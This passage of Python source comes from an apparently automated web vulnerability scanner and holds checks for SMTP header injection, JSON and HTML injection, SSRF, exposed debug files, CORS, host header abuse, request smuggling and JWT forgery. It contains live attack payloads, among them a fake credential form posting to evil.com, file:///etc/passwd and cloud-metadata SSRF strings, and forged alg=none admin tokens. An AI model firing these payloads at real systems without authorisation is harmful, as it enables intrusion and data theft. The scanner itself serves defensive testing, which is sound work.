        ("test@test.com\r\nCc: evil@attacker.com", "CC injection"),
        ("test@test.com\r\nBcc: evil@attacker.com", "BCC injection"),
        ("test@test.com%0d%0aCc: evil@attacker.com", "URL-encoded CC injection"),
        ("test@test.com\nCc: evil@attacker.com", "LF CC injection"),
        ("test@test.com\r\nSubject: Pwned\r\n\r\nInjected body", "full header injection"),
        ("test@test.com%0ACc: evil@attacker.com", "URL-encoded LF CC"),
    ]

    email_fields = ["email", "to", "from", "recipient", "sender", "cc", "bcc",
                     "reply_to", "replyTo", "contact_email", "notify"]

    try:
        for payload, desc in smtp_payloads:
            for field in email_fields:
                body = {field: payload, "subject": "test", "message": "test", "body": "test"}
                resp = await _safe_post(client, url, data=body)
                if not resp:
                    resp = await _safe_post(client, url, json=body)
                if resp and resp.status_code in (200, 201, 302):
                    # Check if server accepted without error
                    error_indicators = ["invalid email", "invalid address", "not valid", "bad email"]
                    if not any(ind in resp.text.lower() for ind in error_indicators):
                        findings.append(_finding(
                            template_id="pro-smtp-injection",
                            name=f"SMTP Header Injection ({desc})",
                            severity="medium",
                            url=url,
                            description=(
                                f"Email parameter '{field}' accepted CRLF payload without validation. "
                                f"Technique: {desc}. This may allow adding CC/BCC recipients or injecting headers."
                            ),
                            confidence="tentative",
                            remediation="Validate email addresses strictly. Strip CR/LF from email inputs.",
                        ))
                        return findings
    except Exception as e:
        log.debug("smtp_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 34. json_injection
# ═════════════════════════════════════════════════════════════════════════════

async def json_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """JSON injection: closing brace + new keys to modify JSON structure."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    json_payloads = [
        ('","admin":true,"x":"', "admin escalation"),
        ('","role":"admin","x":"', "role injection"),
        ('"},"__proto__":{"isAdmin":true},"x":{"y":"', "proto pollution via JSON"),
        ('","$gt":"","x":"', "NoSQL operator injection"),
        ('},"injected":"true","ignore":"', "key injection"),
    ]

    try:
        # Test via query params
        for key in params:
            for payload, desc in json_payloads:
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = params[key][0] + payload
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, dict):
                            if "admin" in data or "role" in data or "injected" in data:
                                findings.append(_finding(
                                    template_id="pro-json-injection",
                                    name=f"JSON Injection ({desc})",
                                    severity="high",
                                    url=url,
                                    description=f"JSON structure modified via parameter injection: {desc}",
                                    confidence="firm",
                                    matched_at=test_url,
                                    remediation="Parse JSON properly. Don't concatenate user input into JSON strings.",
                                ))
                                return findings
                    except Exception:
                        pass

        # Test via POST body — inject extra keys
        test_bodies = [
            {"username": "test", "admin": True},
            {"email": "test@test.com", "role": "admin"},
            {"data": "test", "is_admin": True, "verified": True},
        ]
        for body in test_bodies:
            resp = await _safe_post(client, url, json=body)
            if resp and resp.status_code in (200, 201):
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        for injected_key in ["admin", "role", "is_admin"]:
                            if injected_key in data and injected_key in body:
                                if data[injected_key] == body[injected_key]:
                                    findings.append(_finding(
                                        template_id="pro-json-injection-post",
                                        name="JSON Key Injection via POST",
                                        severity="high",
                                        url=url,
                                        description=f"Server reflected injected key '{injected_key}' with value '{data[injected_key]}'.",
                                        confidence="tentative",
                                        remediation="Whitelist allowed JSON keys server-side.",
                                    ))
                                    return findings
                except Exception:
                    pass
    except Exception as e:
        log.debug("json_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 35. html_injection
# ═════════════════════════════════════════════════════════════════════════════

async def html_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """HTML tag injection in non-script context (phishing, content spoofing)."""
    findings: list[ScanFinding] = []

    html_payloads = [
        ('<h1>Injected by PXE</h1>', "h1 tag"),
        ('<a href="http://evil.com">Click here for support</a>', "anchor tag"),
        ('<form action="http://evil.com/steal"><input name="password" type="password"><input type="submit"></form>', "form injection"),
        ('<img src="http://evil.com/pixel.gif">', "img tag"),
        ('<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Site Maintenance</h1></div>', "content overlay"),
        ('<iframe src="http://evil.com" width="0" height="0">', "hidden iframe"),
        ('<marquee>INJECTED CONTENT</marquee>', "marquee tag"),
    ]

    try:
        for payload, desc in html_payloads[:3]:  # Test first 3 impactful ones
            for test_url in _inject_params(url, payload):
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue
                # Check if HTML was rendered (not encoded)
                if payload in resp.text:
                    # Make sure it's not HTML-encoded
                    encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                    if encoded not in resp.text:
                        findings.append(_finding(
                            template_id="pro-html-injection",
                            name=f"HTML Injection ({desc})",
                            severity="medium",
                            url=url,
                            description=(
                                f"HTML tag injection reflected unescaped: {desc}. "
                                "Can be used for phishing, content spoofing, or form injection."
                            ),
                            confidence="confirmed",
                            matched_at=test_url,
                            extracted=[payload[:80]],
                            remediation="HTML-encode all user input in output context.",
                        ))
                        return findings

        # Test via POST
        for payload, desc in html_payloads[:2]:
            resp = await _safe_post(client, url, data={"input": payload, "name": payload, "comment": payload})
            if resp and payload in resp.text:
                encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                if encoded not in resp.text:
                    findings.append(_finding(
                        template_id="pro-html-injection-post",
                        name=f"HTML Injection via POST ({desc})",
                        severity="medium",
                        url=url,
                        description=f"HTML injection via POST body reflected unescaped: {desc}",
                        confidence="confirmed",
                        remediation="HTML-encode all user input.",
                    ))
                    return findings
    except Exception as e:
        log.debug("html_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 36. ssrf_protocol
# ═════════════════════════════════════════════════════════════════════════════

async def ssrf_protocol(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """SSRF via gopher://, dict://, file://, ftp:// protocol handlers in URL params."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    uid = hashlib.md5(url.encode()).hexdigest()[:8]

    url_keys = ["url", "uri", "link", "href", "src", "dest", "redirect", "next",
                "target", "path", "file", "page", "feed", "host", "site", "callback",
                "return", "returnUrl", "return_url", "continue", "go", "out"]

    ssrf_payloads = [
        (f"http://{uid}.ssrf.{COLLAB_DOMAIN}/probe", "HTTP OOB"),
        (f"https://{uid}.ssrf-s.{COLLAB_DOMAIN}/probe", "HTTPS OOB"),
        ("file:///etc/passwd", "file:// passwd"),
        ("file:///c:/windows/win.ini", "file:// win.ini"),
        ("gopher://127.0.0.1:6379/_INFO%0d%0a", "gopher Redis"),
        ("dict://127.0.0.1:6379/INFO", "dict:// Redis"),
        ("ftp://127.0.0.1:21/", "FTP localhost"),
        (f"http://127.0.0.1:80/", "localhost HTTP"),
        (f"http://[::1]:80/", "IPv6 localhost"),
        ("http://0.0.0.0/", "0.0.0.0"),
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
        # Bypass variants
        ("http://0177.0.0.1/", "octal localhost"),
        ("http://0x7f000001/", "hex localhost"),
        ("http://2130706433/", "decimal localhost"),
        ("http://127.1/", "short localhost"),
        (f"http://evil.{COLLAB_DOMAIN}@127.0.0.1/", "URL authority bypass"),
    ]

    try:
        for key in params:
            if key.lower() not in url_keys and "url" not in key.lower() and "uri" not in key.lower():
                continue
            for payload, desc in ssrf_payloads:
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue

                # Check for file read indicators
                if "file://" in payload:
                    if "root:" in resp.text or "[fonts]" in resp.text or "/bin/" in resp.text:
                        findings.append(_finding(
                            template_id="pro-ssrf-file-read",
                            name=f"SSRF File Read ({desc})",
                            severity="critical",
                            url=url,
                            description=f"SSRF via '{key}' parameter read local file using {payload}",
                            confidence="confirmed",
                            matched_at=test_url,
                            remediation="Validate and whitelist URLs server-side. Block file:// protocol.",
                        ))
                        return findings

                # Check for cloud metadata
                if "169.254.169.254" in payload or "metadata" in payload:
                    if "ami-id" in resp.text or "instance-id" in resp.text or "project" in resp.text:
                        findings.append(_finding(
                            template_id="pro-ssrf-cloud-metadata",
                            name=f"SSRF Cloud Metadata Access ({desc})",
                            severity="critical",
                            url=url,
                            description=f"SSRF accessed cloud metadata via '{key}': {desc}",
                            confidence="confirmed",
                            matched_at=test_url,
                            extracted=[resp.text[:200]],
                            remediation="Block access to cloud metadata IPs. Use IMDSv2 with hop limit.",
                        ))
                        return findings

                # Generic OOB check
                if COLLAB_DOMAIN in payload and resp.status_code not in (400, 403, 404):
                    findings.append(_finding(
                        template_id="pro-ssrf-oob",
                        name=f"Potential SSRF ({desc})",
                        severity="high",
                        url=url,
                        description=(
                            f"URL parameter '{key}' accepted SSRF payload. "
                            f"Check collaborator for interactions from {uid}.*.{COLLAB_DOMAIN}"
                        ),
                        confidence="tentative",
                        matched_at=test_url,
                        remediation="Validate URLs server-side. Use allowlists for outbound requests.",
                    ))
                    return findings
    except Exception as e:
        log.debug("ssrf_protocol error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 37. backup_file_probe
# ═════════════════════════════════════════════════════════════════════════════

async def backup_file_probe(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Probe for backup/editor temp files: .bak, .old, .orig, .swp, ~, .save, etc."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)

    # Get baseline 404
    base = f"{parsed.scheme}://{parsed.netloc}"
    resp_404 = await _safe_get(client, urljoin(base, "/pxe_nonexistent_12345.html"))
    baseline_404_len = len(resp_404.text) if resp_404 else 0

    path = parsed.path
    if not path or path == "/":
        path = "/index.html"

    # Generate backup variants
    name_base = path.rsplit(".", 1)[0] if "." in path else path
    extension = "." + path.rsplit(".", 1)[1] if "." in path else ""

    suffixes = [
        ".bak", ".old", ".orig", ".save", ".swp", ".swo",
        "~", ".tmp", ".temp", ".backup", ".copy",
        ".1", ".2", ".prev", ".dist", ".sample",
        ".bk", ".BAK", ".OLD",
    ]

    prefixes = [".", "_", "Copy of "]
    wrappers = ["{}.bak", "{}.old", "#{}", ".{}.swp"]

    test_paths = set()
    for suffix in suffixes:
        test_paths.add(path + suffix)
        test_paths.add(name_base + suffix + extension)
    for prefix in prefixes:
        basename = path.rsplit("/", 1)[-1]
        dirname = path.rsplit("/", 1)[0] if "/" in path else ""
        test_paths.add(f"{dirname}/{prefix}{basename}")
    for wrapper in wrappers:
        basename = path.rsplit("/", 1)[-1]
        dirname = path.rsplit("/", 1)[0] if "/" in path else ""
        test_paths.add(f"{dirname}/{wrapper.format(basename)}")

    try:
        for test_path in test_paths:
            test_url = urljoin(base, test_path)
            resp = await _safe_get(client, test_url)
            if not resp:
                continue
            if resp.status_code == 200 and len(resp.text) > 50:
                # Verify it's not a soft 404
                if baseline_404_len > 0 and abs(len(resp.text) - baseline_404_len) < 50:
                    continue
                ct = resp.headers.get("content-type", "")
                # Should not be a normal HTML page (likely source code or data)
                if "html" not in ct or len(resp.text) < 5000:
                    findings.append(_finding(
                        template_id="pro-backup-file",
                        name=f"Backup File Found ({test_path})",
                        severity="medium",
                        url=test_url,
                        description=(
                            f"Backup/temp file accessible: {test_path} "
                            f"({len(resp.text)} bytes, Content-Type: {ct}). "
                            "May contain source code, credentials, or sensitive configuration."
                        ),
                        confidence="firm",
                        remediation="Remove backup files from web root. Configure web server to block .bak/.old/.swp extensions.",
                    ))
                    if len(findings) >= 3:
                        return findings
    except Exception as e:
        log.debug("backup_file_probe error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 38. debug_endpoint_probe
# ═════════════════════════════════════════════════════════════════════════════

async def debug_endpoint_probe(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Probe for exposed debug/admin endpoints: actuator, debug, phpinfo, etc."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    debug_paths = {
        # Spring Boot Actuator
        "/actuator": "Spring Boot Actuator",
        "/actuator/env": "Spring Actuator Env",
        "/actuator/health": "Spring Actuator Health",
        "/actuator/beans": "Spring Actuator Beans",
        "/actuator/configprops": "Spring Actuator Config",
        "/actuator/mappings": "Spring Actuator Mappings",
        "/actuator/heapdump": "Spring Actuator Heap Dump",
        "/actuator/threaddump": "Spring Actuator Thread Dump",
        # Debug endpoints
        "/_debug": "Debug Panel",
        "/__debug__": "Python Debug",
        "/debug": "Debug Endpoint",
        "/debug/vars": "Go Debug Vars",
        "/debug/pprof": "Go Profiling",
        # Monitoring
        "/trace": "Trace Endpoint",
        "/metrics": "Metrics",
        "/health": "Health Check",
        "/status": "Status",
        "/info": "Info",
        # PHP
        "/phpinfo.php": "PHP Info",
        "/info.php": "PHP Info Alt",
        "/test.php": "PHP Test",
        # ASP.NET
        "/elmah.axd": "ELMAH Error Log",
        "/trace.axd": "ASP.NET Trace",
        # Other
        "/.env": "Environment File",
        "/server-status": "Apache Server Status",
        "/server-info": "Apache Server Info",
        "/nginx_status": "Nginx Status",
        "/_config": "Config Endpoint",
        "/api/debug": "API Debug",
        "/graphiql": "GraphiQL IDE",
        "/swagger-ui.html": "Swagger UI",
        "/api-docs": "API Docs",
        "/.git/config": "Git Config",
        "/.svn/entries": "SVN Entries",
        "/.DS_Store": "DS_Store",
        "/wp-config.php.bak": "WordPress Config Backup",
        "/web.config": "IIS Config",
    }

    # Get baseline 404 for false positive detection
    resp_404 = await _safe_get(client, urljoin(base, "/pxe_nonexist_98765.html"))
    baseline_404 = resp_404.text if resp_404 else ""
    baseline_404_len = len(baseline_404)

    try:
        for path, desc in debug_paths.items():
            test_url = urljoin(base, path)
            resp = await _safe_get(client, test_url)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            # Skip if response looks like a soft 404
            if baseline_404_len > 0 and abs(len(resp.text) - baseline_404_len) < 100:
                continue

            # Validate content based on endpoint type
            is_valid = False
            severity = "medium"

            if "actuator" in path:
                if any(k in resp.text for k in ['"status"', '"beans"', '"properties"', '"mappings"']):
                    is_valid = True
                    severity = "high"
            elif "phpinfo" in path or "info.php" in path:
                if "phpinfo()" in resp.text or "PHP Version" in resp.text:
                    is_valid = True
                    severity = "medium"
            elif path == "/.env":
                if "=" in resp.text and ("DB_" in resp.text or "API_" in resp.text or "SECRET" in resp.text):
                    is_valid = True
                    severity = "critical"
            elif ".git/config" in path:
                if "[core]" in resp.text or "repositoryformatversion" in resp.text:
                    is_valid = True
                    severity = "high"
            elif "swagger" in path or "api-docs" in path:
                if "swagger" in resp.text.lower() or "openapi" in resp.text.lower():
                    is_valid = True
                    severity = "info"
            elif "graphiql" in path:
                if "graphiql" in resp.text.lower() or "graphql" in resp.text.lower():
                    is_valid = True
                    severity = "low"
            elif path in ("/health", "/status", "/info"):
                if resp.status_code == 200 and len(resp.text) > 10:
                    is_valid = True
                    severity = "info"
            elif "elmah" in path or "trace.axd" in path:
                if "error" in resp.text.lower() or "trace" in resp.text.lower():
                    is_valid = True
                    severity = "high"
            elif "server-status" in path or "nginx_status" in path:
                if "uptime" in resp.text.lower() or "requests" in resp.text.lower() or "server" in resp.text.lower():
                    is_valid = True
                    severity = "medium"
            elif "debug" in path or "pprof" in path:
                if len(resp.text) > 100:
                    is_valid = True
                    severity = "high"
            elif "heapdump" in path:
                if len(resp.text) > 1000:
                    is_valid = True
                    severity = "critical"
            else:
                if resp.status_code == 200 and len(resp.text) > 50:
                    is_valid = True

            if is_valid:
                findings.append(_finding(
                    template_id=f"pro-debug-endpoint-{path.strip('/').replace('/', '-')[:30]}",
                    name=f"Debug/Admin Endpoint Exposed ({desc})",
                    severity=severity,
                    url=test_url,
                    description=f"Sensitive endpoint accessible: {path} ({desc}). {len(resp.text)} bytes returned.",
                    confidence="firm" if severity in ("critical", "high") else "tentative",
                    remediation="Restrict debug endpoints to internal networks. Remove from production.",
                ))
                if len(findings) >= 5:
                    return findings
    except Exception as e:
        log.debug("debug_endpoint_probe error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 39. graphql_introspection
# ═════════════════════════════════════════════════════════════════════════════

async def graphql_introspection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect exposed GraphQL introspection queries."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    graphql_paths = ["/graphql", "/graphql/", "/api/graphql", "/gql", "/query",
                     "/v1/graphql", "/v2/graphql", parsed.path]

    introspection_query = {
        "query": "{ __schema { queryType { name } types { name kind fields { name } } } }"
    }

    introspection_full = {
        "query": """query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                types { name kind description fields { name type { name kind } } }
            }
        }"""
    }

    try:
        for path in graphql_paths:
            gql_url = urljoin(base, path)

            # Try POST with JSON
            resp = await _safe_post(client, gql_url, json=introspection_query)
            if not resp:
                # Try GET with query param
                resp = await _safe_get(client, gql_url + "?query=" + quote(introspection_query["query"]))

            if not resp:
                continue

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "data" in data and "__schema" in str(data.get("data", {})):
                        schema_data = data.get("data", {}).get("__schema", {})
                        type_count = len(schema_data.get("types", []))
                        type_names = [t.get("name", "") for t in schema_data.get("types", [])[:10]]

                        findings.append(_finding(
                            template_id="pro-graphql-introspection",
                            name="GraphQL Introspection Enabled",
                            severity="medium",
                            url=gql_url,
                            description=(
                                f"GraphQL introspection is enabled, exposing {type_count} types. "
                                f"Sample types: {', '.join(type_names)}. "
                                "Full schema is accessible to attackers."
                            ),
                            confidence="confirmed",
                            extracted=type_names[:5],
                            remediation="Disable introspection in production. Use field-level authorization.",
                        ))
                        return findings
                except Exception:
                    pass

            # Check for GraphQL error that confirms the endpoint
            if resp.status_code in (200, 400):
                if "graphql" in resp.text.lower() or "syntax error" in resp.text.lower():
                    findings.append(_finding(
                        template_id="pro-graphql-endpoint",
                        name=f"GraphQL Endpoint Found ({path})",
                        severity="info",
                        url=gql_url,
                        description="GraphQL endpoint detected (introspection may be disabled).",
                        confidence="confirmed",
                        remediation="Ensure proper authentication and authorization on GraphQL endpoint.",
                    ))
                    break
    except Exception as e:
        log.debug("graphql_introspection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 40. cors_wildcard_credentials
# ═════════════════════════════════════════════════════════════════════════════

async def cors_wildcard_credentials(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Check for CORS misconfigurations: wildcard + credentials, origin reflection, null origin."""
    findings: list[ScanFinding] = []

    test_origins = [
        f"http://evil.{COLLAB_DOMAIN}",
        "http://attacker.com",
        "null",
        "http://sub.evil.com",
    ]

    try:
        # Test with no Origin (baseline)
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        baseline_acao = baseline.headers.get("access-control-allow-origin", "")

        # Test with various evil origins
        for origin in test_origins:
            resp = await _safe_get(client, url, headers={"Origin": origin})
            if not resp:
                continue

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "").lower()

            if not acao:
                continue

            # Wildcard with credentials
            if acao == "*" and acac == "true":
                findings.append(_finding(
                    template_id="pro-cors-wildcard-creds",
                    name="CORS Wildcard with Credentials",
                    severity="high",
                    url=url,
                    description="CORS allows wildcard origin (*) with Access-Control-Allow-Credentials: true.",
                    confidence="confirmed",
                    remediation="Don't use wildcard with credentials. Validate specific origins.",
                ))
                return findings

            # Origin reflection
            if acao == origin and origin != "null":
                severity = "high" if acac == "true" else "medium"
                findings.append(_finding(
                    template_id="pro-cors-origin-reflection",
                    name="CORS Origin Reflection",
                    severity=severity,
                    url=url,
                    description=(
                        f"CORS reflects arbitrary Origin: {origin} -> Access-Control-Allow-Origin: {acao}. "
                        f"Credentials: {acac}. {'Attacker can steal authenticated data.' if acac == 'true' else ''}"
                    ),
                    confidence="confirmed",
                    remediation="Maintain a whitelist of allowed origins. Never reflect arbitrary origins.",
                ))
                return findings

            # Null origin accepted
            if origin == "null" and acao == "null":
                findings.append(_finding(
                    template_id="pro-cors-null-origin",
                    name="CORS Null Origin Accepted",
                    severity="medium",
                    url=url,
                    description="CORS accepts 'null' origin. Sandboxed iframes and data: URIs can exploit this.",
                    confidence="confirmed",
                    remediation="Do not whitelist 'null' origin.",
                ))
                return findings

        # Wildcard without credentials (lower severity)
        if baseline_acao == "*":
            findings.append(_finding(
                template_id="pro-cors-wildcard",
                name="CORS Allows All Origins",
                severity="low",
                url=url,
                description="Access-Control-Allow-Origin: * allows any origin to read responses.",
                confidence="confirmed",
                remediation="Restrict CORS to specific trusted origins.",
            ))
    except Exception as e:
        log.debug("cors_wildcard_credentials error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 41. host_header_ssrf
# ═════════════════════════════════════════════════════════════════════════════

async def host_header_ssrf(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Host header manipulation for SSRF/routing bypass via X-Forwarded-Host, X-Original-URL, etc."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    uid = hashlib.md5(url.encode()).hexdigest()[:8]

    evil_host = f"{uid}.host.{COLLAB_DOMAIN}"

    host_headers = {
        "Host": evil_host,
        "X-Forwarded-Host": evil_host,
        "X-Host": evil_host,
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Forwarded-Server": evil_host,
        "X-HTTP-Host-Override": evil_host,
        "Forwarded": f"host={evil_host}",
    }

    try:
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        for header, value in host_headers.items():
            if header == "Host":
                # Don't override Host directly (may break routing)
                continue
            resp = await _safe_get(client, url, headers={header: value})
            if not resp:
                continue

            # Check if evil host appears in response (password reset links, etc.)
            if evil_host in resp.text:
                findings.append(_finding(
                    template_id="pro-host-header-injection",
                    name=f"Host Header Injection ({header})",
                    severity="high",
                    url=url,
                    description=(
                        f"Injected host '{evil_host}' via {header} appears in response body. "
                        "Can be exploited for password reset poisoning, cache poisoning, or SSRF."
                    ),
                    confidence="confirmed",
                    matched_at=url,
                    remediation="Ignore X-Forwarded-Host from untrusted sources. Hardcode application URLs.",
                ))
                return findings

            # Check for X-Original-URL / X-Rewrite-URL bypass
            if header in ("X-Original-URL", "X-Rewrite-URL"):
                if resp.status_code == 200 and resp.text != baseline.text:
                    admin_indicators = ["admin", "dashboard", "settings", "manage"]
                    if any(ind in resp.text.lower() for ind in admin_indicators):
                        findings.append(_finding(
                            template_id="pro-url-rewrite-bypass",
                            name=f"URL Rewrite Bypass ({header})",
                            severity="high",
                            url=url,
                            description=(
                                f"Using {header}: /admin bypassed access controls. "
                                "The actual URL was rewritten server-side."
                            ),
                            confidence="firm",
                            remediation=f"Do not honor {header} from untrusted sources.",
                        ))
                        return findings

            # Check for redirect to evil host
            if resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("location", "")
                if evil_host in location:
                    findings.append(_finding(
                        template_id="pro-host-header-redirect",
                        name=f"Host Header Redirect ({header})",
                        severity="medium",
                        url=url,
                        description=f"Server redirects to attacker-controlled host via {header}: {location}",
                        confidence="confirmed",
                        remediation="Don't use Host header for redirect targets.",
                    ))
                    return findings
    except Exception as e:
        log.debug("host_header_ssrf error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 42. request_smuggling_te_cl
# ═════════════════════════════════════════════════════════════════════════════

async def request_smuggling_te_cl(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Transfer-Encoding / Content-Length desync detection (CL.TE and TE.CL)."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    target = f"{parsed.scheme}://{parsed.netloc}/"

    try:
        # CL.TE: front-end uses CL, back-end uses TE
        clte_body = "0\r\n\r\nSMUGGLED_CLTE"
        resp = await _safe_post(
            client, target,
            content=clte_body.encode(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "Content-Length": str(len(clte_body)),
            },
        )
        if resp and resp.status_code not in (400, 501):
            # Send a follow-up normal request to detect poisoning
            resp2 = await _safe_get(client, target)
            if resp2 and "SMUGGLED_CLTE" in resp2.text:
                findings.append(_finding(
                    template_id="pro-smuggling-clte-confirmed",
                    name="HTTP Request Smuggling (CL.TE Confirmed)",
                    severity="critical",
                    url=target,
                    description="CL.TE request smuggling confirmed — smuggled content appeared in subsequent response.",
                    confidence="confirmed",
                    remediation="Use HTTP/2 end-to-end. Normalize Transfer-Encoding handling.",
                ))
                return findings
            elif resp.status_code == 200:
                findings.append(_finding(
                    template_id="pro-smuggling-clte-potential",
                    name="Potential HTTP Request Smuggling (CL.TE)",
                    severity="high",
                    url=target,
                    description="Server accepted conflicting CL+TE headers without error.",
                    confidence="tentative",
                    remediation="Reject requests with both Content-Length and Transfer-Encoding.",
                ))

        # TE.CL: front-end uses TE, back-end uses CL
        tecl_body = "1\r\nG\r\n0\r\n\r\n"
        resp = await _safe_post(
            client, target,
            content=tecl_body.encode(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",
            },
        )
        if resp and resp.status_code not in (400, 501):
            if resp.status_code == 200:
                findings.append(_finding(
                    template_id="pro-smuggling-tecl-potential",
                    name="Potential HTTP Request Smuggling (TE.CL)",
                    severity="high",
                    url=target,
                    description="Server accepted TE.CL desync payload (chunked body with short CL).",
                    confidence="tentative",
                    remediation="Reject ambiguous Transfer-Encoding/Content-Length combinations.",
                ))

        # TE.TE: Transfer-Encoding obfuscation
        te_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked\x00",
        ]
        for te in te_variants:
            # This is more of a reference check; actual exploitation requires raw sockets
            pass
    except Exception as e:
        log.debug("request_smuggling_te_cl error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 43. jwt_key_confusion
# ═════════════════════════════════════════════════════════════════════════════

async def jwt_key_confusion(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """JWT RS256 to HS256 algorithm confusion attack."""
    findings: list[ScanFinding] = []

    try:
        # First, get a response to find any JWTs
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        # Look for JWTs in response headers and body
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        found_jwts = re.findall(jwt_pattern, resp.text)
        # Also check Authorization header from cookies/headers
        auth_header = resp.headers.get("authorization", "")
        if auth_header:
            jwt_match = re.search(jwt_pattern, auth_header)
            if jwt_match:
                found_jwts.append(jwt_match.group(0))

        for jwt_token in found_jwts[:1]:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                continue

            try:
                # Decode header
                header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(header_b64))

                payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))

                original_alg = header.get("alg", "")

                # Test alg=none
                none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
                none_token = f"{none_header}.{parts[1]}."

                resp_none = await _safe_get(client, url, headers={"Authorization": f"Bearer {none_token}"})
                if resp_none and resp_none.status_code == 200:
                    # Check if we got more data than without auth
                    resp_noauth = await _safe_get(client, url)
                    if resp_noauth and len(resp_none.text) > len(resp_noauth.text) + 20:
                        findings.append(_finding(
                            template_id="pro-jwt-none-bypass",
                            name="JWT Algorithm None Bypass",
                            severity="critical",
                            url=url,
                            description=f"JWT with alg=none accepted. Original alg: {original_alg}.",
                            confidence="confirmed",
                            remediation="Reject alg=none. Enforce algorithm whitelist.",
                        ))
                        return findings

                # Test RS256 -> HS256 confusion
                if original_alg.startswith("RS"):
                    hs_header = base64.urlsafe_b64encode(
                        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                    ).decode().rstrip("=")
                    # Sign with empty key as proof of concept
                    import hmac
                    signing_input = f"{hs_header}.{parts[1]}".encode()
                    signature = base64.urlsafe_b64encode(
                        hmac.new(b"", signing_input, hashlib.sha256).digest()
                    ).decode().rstrip("=")
                    confused_token = f"{hs_header}.{parts[1]}.{signature}"

                    resp_confused = await _safe_get(client, url, headers={"Authorization": f"Bearer {confused_token}"})
                    if resp_confused and resp_confused.status_code == 200:
                        findings.append(_finding(
                            template_id="pro-jwt-key-confusion",
                            name="JWT RS256→HS256 Key Confusion",
                            severity="critical",
                            url=url,
                            description=(
                                f"JWT algorithm switched from {original_alg} to HS256 was accepted. "
                                "The public RSA key may be used as HMAC secret, allowing token forgery."
                            ),
                            confidence="tentative",
                            remediation="Enforce expected algorithm. Use asymmetric key verification.",
                        ))
                        return findings
            except Exception:
                continue

        # If no JWTs found in response, check common auth headers
        if not found_jwts:
            none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
            admin_payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin","iat":1}').decode().rstrip("=")
            forged = f"{none_header}.{admin_payload}."
            resp = await _safe_get(client, url, headers={"Authorization": f"Bearer {forged}"})
            if resp and resp.status_code == 200:
                noauth = await _safe_get(client, url)
                if noauth and len(resp.text) > len(noauth.text) + 50:
